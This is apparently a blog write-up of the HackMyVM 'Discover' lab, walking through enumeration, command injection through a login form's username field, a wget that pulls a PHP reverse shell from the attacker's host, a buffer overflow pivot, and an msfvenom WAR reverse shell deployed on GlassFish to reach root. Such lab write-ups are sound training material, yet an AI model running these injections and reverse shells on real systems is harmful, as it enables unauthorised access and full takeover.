---
layout: post
title: "HackMyVM - Discover"
date: 2023-03-11 23:45 +0100
categories: hmv
tag: ["RCE"]
---

Creator: [powerful](https://hackmyvm.eu/profile/?user=powerful)
Level: Medium
Release Date: 2022-09-01

## Scan & Enumeration

```bash
$ nmap -sC -sV -oA nmap/Discover -p- 192.168.1.15
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-11 23:45 WET
Nmap scan report for 192.168.1.15
Host is up (0.00035s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT     STATE SERVICE              VERSION
80/tcp   open  http                 Apache httpd 2.4.54
|_http-title: Did not follow redirect to http://discover.hmv/
|_http-server-header: Apache/2.4.54 (Debian)
3700/tcp open  giop                 CORBA naming service
4848/tcp open  appserv-http?
| fingerprint-strings: 
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Date: Sat, 11 Mar 2023 23:45:25 GMT
|     Connection: close
|     Content-Length: 0
|   SIPOptions: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Date: Sat, 11 Mar 2023 23:46:37 GMT
|     Connection: close
|_    Content-Length: 0
7676/tcp open  java-message-service Java Message Service 301
8080/tcp open  http-proxy           Eclipse GlassFish  6.1.0 
| fingerprint-strings: 
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Date: Sat, 11 Mar 2023 23:45:20 GMT
|     Connection: close
|_    Content-Length: 0
|_http-title: Eclipse GlassFish - Server Running
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Eclipse GlassFish  6.1.0 
8181/tcp open  ssl/intermapper?
| ssl-cert: Subject: commonName=localhost/organizationName=Eclipse.org Foundation Inc/stateOrProvinceName=Ontario/countryName=CA
| Not valid before: 2021-05-22T16:19:00
|_Not valid after:  2031-05-20T16:19:00
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
8686/tcp open  java-rmi             Java RMI
| rmi-dumpregistry: 
|   debian/7676/jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:44711
|     extends
|       java.rmi.server.RemoteStub
|       extends
|         java.rmi.server.RemoteObject
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:8686
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4848-TCP:V=7.93%I=7%D=3/11%Time=640D1296%P=x86_64-pc-linux-gnu%r(RT
SF:SPRequest,E6,"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r
SF:\nServer:\x20Eclipse\x20GlassFish\x20\x206\.1\.0\x20\r\nX-Powered-By:\x
SF:20Servlet/5\.0\x20JSP/3\.0\(Eclipse\x20GlassFish\x20\x206\.1\.0\x20\x20
SF:Java/Debian/11\)\r\nDate:\x20Sat,\x2011\x20Mar\x202023\x2023:45:25\x20G
SF:MT\r\nConnection:\x20close\r\nContent-Length:\x200\r\n\r\n")%r(SIPOptio
SF:ns,E6,"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nServe
SF:r:\x20Eclipse\x20GlassFish\x20\x206\.1\.0\x20\r\nX-Powered-By:\x20Servl
SF:et/5\.0\x20JSP/3\.0\(Eclipse\x20GlassFish\x20\x206\.1\.0\x20\x20Java/De
SF:bian/11\)\r\nDate:\x20Sat,\x2011\x20Mar\x202023\x2023:46:37\x20GMT\r\nC
SF:onnection:\x20close\r\nContent-Length:\x200\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.93%I=7%D=3/11%Time=640D1292%P=x86_64-pc-linux-gnu%r(RT
SF:SPRequest,E6,"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r
SF:\nServer:\x20Eclipse\x20GlassFish\x20\x206\.1\.0\x20\r\nX-Powered-By:\x
SF:20Servlet/5\.0\x20JSP/3\.0\(Eclipse\x20GlassFish\x20\x206\.1\.0\x20\x20
SF:Java/Debian/11\)\r\nDate:\x20Sat,\x2011\x20Mar\x202023\x2023:45:20\x20G
SF:MT\r\nConnection:\x20close\r\nContent-Length:\x200\r\n\r\n");
Service Info: Host: discover.hmv

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 177.72 seconds
```

* Domain : discover.hmv

### Gobuster (files)

```bash
$ gobuster dir -e -w /usr/share/wordlists/dirb/big.txt -x php -t 40 -u http://discover.hmv | tee gobuster_discover.log
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://discover.hmv
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/03/11 23:53:00 Starting gobuster in directory enumeration mode
===============================================================
http://discover.hmv/.htpasswd.php        (Status: 403) [Size: 277]
http://discover.hmv/.htpasswd            (Status: 403) [Size: 277]
http://discover.hmv/.htaccess            (Status: 403) [Size: 277]
http://discover.hmv/.htaccess.php        (Status: 403) [Size: 277]
http://discover.hmv/aboutus.php          (Status: 200) [Size: 17734]
http://discover.hmv/adminpanel.php       (Status: 200) [Size: 8895]
http://discover.hmv/assets               (Status: 301) [Size: 313] [--> http://discover.hmv/assets/]
http://discover.hmv/chat2.php            (Status: 500) [Size: 2287]
http://discover.hmv/chat1.php            (Status: 200) [Size: 2604]
http://discover.hmv/contactform          (Status: 301) [Size: 318] [--> http://discover.hmv/contactform/]
http://discover.hmv/contact.php          (Status: 200) [Size: 1363]
http://discover.hmv/courses              (Status: 301) [Size: 314] [--> http://discover.hmv/courses/]
http://discover.hmv/courses.php          (Status: 200) [Size: 19066]
http://discover.hmv/css                  (Status: 301) [Size: 310] [--> http://discover.hmv/css/]
http://discover.hmv/fonts                (Status: 301) [Size: 312] [--> http://discover.hmv/fonts/]
http://discover.hmv/forgotpassword.php   (Status: 200) [Size: 1063]
http://discover.hmv/home.php             (Status: 200) [Size: 29575]
http://discover.hmv/img                  (Status: 301) [Size: 310] [--> http://discover.hmv/img/]
http://discover.hmv/js                   (Status: 301) [Size: 309] [--> http://discover.hmv/js/]
http://discover.hmv/logout.php           (Status: 302) [Size: 22] [--> home.php]
http://discover.hmv/manual               (Status: 301) [Size: 313] [--> http://discover.hmv/manual/]
http://discover.hmv/myaccount.php        (Status: 200) [Size: 6302]
http://discover.hmv/payment.php          (Status: 200) [Size: 1351]
http://discover.hmv/review.php           (Status: 200) [Size: 1277]
http://discover.hmv/server-status        (Status: 403) [Size: 277]
http://discover.hmv/statistics.php       (Status: 500) [Size: 1339]
Progress: 39506 / 40940 (96.50%)
===============================================================
2023/03/11 23:53:12 Finished
===============================================================
```

### Gobuster (vhost)

```bash
$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://discover.hmv --append-domain | grep -v 302
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://discover.hmv
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.4
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/03/15 08:12:09 Starting gobuster in VHOST enumeration mode
===============================================================
Found: log.discover.hmv Status: 200 [Size: 822]
Progress: 4881 / 4990 (97.82%)
===============================================================
2023/03/15 08:12:10 Finished
===============================================================
```

* Subdomain : log.discover.hmv

### Fuzzing Command Execution

```bash
id
date
ls
```

```bash
$ wfuzz -c -w commands.txt -u 'http://log.discover.hmv/index.php?username=FUZZ&password=1234' --hw 51
```

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://log.discover.hmv/index.php?username=FUZZ&password=1234
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                              
=====================================================================

000000002:   200        23 L     57 W       851 Ch      "date"                                                                                               
000000003:   200        23 L     52 W       832 Ch      "ls"                                                                                                 
000000001:   200        23 L     54 W       876 Ch      "id"                                                                                                 

Total time: 0
Processed Requests: 4
Filtered Requests: 1
Requests/sec.: 0
```

<img src="https://drive.google.com/uc?id=1u2vSFgb5mOij_TovuqCLfAHv_krjRcTa"/>

## Reverse Shell 

* Upload Shell

```bash
$ curl "http://log.discover.hmv/index.php?username=wget%20-o%20/tmp/rshell.php%20http://192.168.1.6:9000/rshell.php&password=1234"
```

```bash
$ python -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
192.168.1.10 - - [15/Mar/2023 20:35:01] "GET /rshell.php HTTP/1.1" 200 -
```

* Permissions and Execution

```bash
$ curl "http://log.discover.hmv/index.php?username=ls%20-la%20/tmp&password=1234"  

...[REDACTED]

drwxrwxrwt  2 root     root     4096 Mar 15 16:34 .
drwxr-xr-x 18 root     root     4096 Aug 24  2022 ..
-rwxrwxrwx  1 www-data www-data 5493 Mar 15 16:34 rshell.php
...[REDACTED]

$ curl "http://log.discover.hmv/index.php?username=chmod%20777%20/tmp/rshell.php&password=1234" 
...[REDACTED]

$ curl "http://log.discover.hmv/index.php?username=pwd%20|%20php%20/tmp/rshell.php&password=1234"
```

```bash
$ nc -lvnp 4444                      
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.10] 38538
Linux debian 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64 GNU/Linux
 16:39:21 up 17 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
stty raw -echo; fg 
```

```bash
www-data@debian:/var/www/html/discover$ sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on debian:
    (discover) NOPASSWD: /opt/overflow
www-data@debian:/var/www/html/discover$

www-data@debian:/opt$ ls -la
total 28
drwxr-xr-x  3 root root 4096 Aug 30  2022 .
drwxr-xr-x 18 root root 4096 Aug 24  2022 ..
drwxr-xr-x  7 root root 4096 May 22  2021 glassfish6
-rw-r--r--  1 root root   44 Aug 30  2022 hint
-rwx--x--x  1 root root 8831 Aug 30  2022 overflow
www-data@debian:/opt$ cat hint
AAAAAAAAAAAAAAAAAAAAAAAA"+"\x5d\x06\x40\x00
www-data@debian:/opt$
```

## Lateral Movement (www-data > discover)

* Python buffer overflow script

```python
import sys
sys.stdout.write("AAAAAAAAAAAAAAAAAAAAAAAA"+"\x5d\x06\x40\x00")
```

```bash
www-data@debian:/tmp$ sudo -u discover /opt/overflow $(python3 exploit.py)
bash: warning: command substitution: ignored null byte in input
$ id
uid=1000(discover) gid=1000(discover) groups=1000(discover),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
$ 
```

## Glassfish6

* Create Domain

```bash
discover@debian:~$ sudo -l
Matching Defaults entries for discover on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User discover may run the following commands on debian:
    (root) NOPASSWD: /opt/glassfish6/bin/asadmin
discover@debian:~$ 
```

```bash
discover@debian:~$ sudo /opt/glassfish6/bin/asadmin stop-domain domain1                                                                                                
Waiting for the domain to stop .                                                                                                                                       
Command stop-domain executed successfully.             

discover@debian:~$ sudo /opt/glassfish6/bin/asadmin create-domain domain2                                                                                              
Enter admin user name [Enter to accept default "admin" / no password]>                                                                                                 
Using default port 4848 for Admin.                                                                                                                                     
Using default port 8080 for HTTP Instance.                                                                                                                             
Using default port 7676 for JMS.                                                                                                                                       
Using default port 3700 for IIOP.                                                                                                                                      
Using default port 8181 for HTTP_SSL.                                                                                                                                  
Using default port 3820 for IIOP_SSL.                                                                                                                                  
Using default port 3920 for IIOP_MUTUALAUTH.                                                                                                                           
Using default port 8686 for JMX_ADMIN.                                                                                                                                 
Using default port 6666 for OSGI_SHELL.                                                                                                                                
Using default port 9009 for JAVA_DEBUGGER.                                                                                                                             
Distinguished Name of the self-signed X.509 Server Certificate is:                                                                                                     
[CN=debian,OU=GlassFish,O=Eclipse.org Foundation Inc,L=Ottawa,ST=Ontario,C=CA]
Distinguished Name of the self-signed X.509 Server Certificate is:
[CN=debian-instance,OU=GlassFish,O=Eclipse.org Foundation Inc,L=Ottawa,ST=Ontario,C=CA]
Domain domain2 created.
Domain domain2 admin port is 4848.
Domain domain2 allows admin login as user "admin" with no password.
Command create-domain executed successfully.

discover@debian:~$ sudo /opt/glassfish6/bin/asadmin start-domain domain2
Waiting for domain2 to start ............
Successfully started the domain : domain2
domain  Location: /opt/glassfish6/glassfish/domains/domain2
Log File: /opt/glassfish6/glassfish/domains/domain2/logs/server.log
Admin Port: 4848
Command start-domain executed successfully.
discover@debian:~$
```

<img src="https://drive.google.com/uc?id=1CFh9QIKSOHI68xZakNSrvAG1JV96AQlv"/>

* Change admin passwd

```bash
discover@debian:~$ sudo /opt/glassfish6/bin/asadmin change-admin-password --domain_name domain2
Enter admin user name [default: admin]>
Enter the admin password> 
Enter the new admin password> admin1234
Enter the new admin password again> admin1234
Command change-admin-password executed successfully.
discover@debian:~$ 
```

* Enable secure admin login

```bash
discover@debian:~$ sudo /opt/glassfish6/bin/asadmin --port 4848 enable-secure-admin
You must restart all running servers for the change in secure admin to take effect.
Command enable-secure-admin executed successfully.

discover@debian:~$ sudo /opt/glassfish6/bin/asadmin stop-domain domain2
Waiting for the domain to stop .
Command stop-domain executed successfully.

discover@debian:~$ sudo /opt/glassfish6/bin/asadmin start-domain domain2
Waiting for domain2 to start ..........
Successfully started the domain : domain2
domain  Location: /opt/glassfish6/glassfish/domains/domain2
Log File: /opt/glassfish6/glassfish/domains/domain2/logs/server.log
Admin Port: 4848
Command start-domain executed successfully.
discover@debian:~$ 
```

<img src="https://drive.google.com/uc?id=1nuBgwACi_NM-x7JX0_D-otsYlCBlD5rr"/>

## MSFVenon WAR shell

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.6 LPORT=4455 -f war > 4455.war  
Payload size: 1087 bytes
Final size of war file: 1087 bytes
```

<img src="https://drive.google.com/uc?id=1UNyOLl77kNGNpfUIe4LvQ6G-Ndqi23SR"/>

<img src="https://drive.google.com/uc?id=12FIRTj12-TDqhBWnfyjqO9cX7l5Haqd8"/>

<img src="https://drive.google.com/uc?id=1y1vchXDey3lmuoMQHX5O6PPpNpPK-2gG"/>

<img src="https://drive.google.com/uc?id=1E1M1CAdBC2y0M6LReTkdzkT4l0AWADFn"/>

* http://discover.hmv:8080/445516537849123169606182/

### MSFconsole Listener

```bash
$ msfconsole -q                                                                        
msf6 > use exploit/multi/handler show options
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp 
payload => java/jsp_shell_reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (java/jsp_shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL                   no        The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set LHOST 192.168.1.6
LHOST => 192.168.1.6
msf6 exploit(multi/handler) > set LPORT 4455
LPORT => 4455                                                                                                                                                          
msf6 exploit(multi/handler) > run                                                                                                                                      

[*] Started reverse TCP handler on 192.168.1.6:4455                                                                                                                    
[*] Command shell session 1 opened (192.168.1.6:4455 -> 192.168.1.12:37366) at 2023-03-16 00:18:45 +0000                                                               
id                                                                                                                                                                     
uid=0(root) gid=0(root) groups=0(root)
```
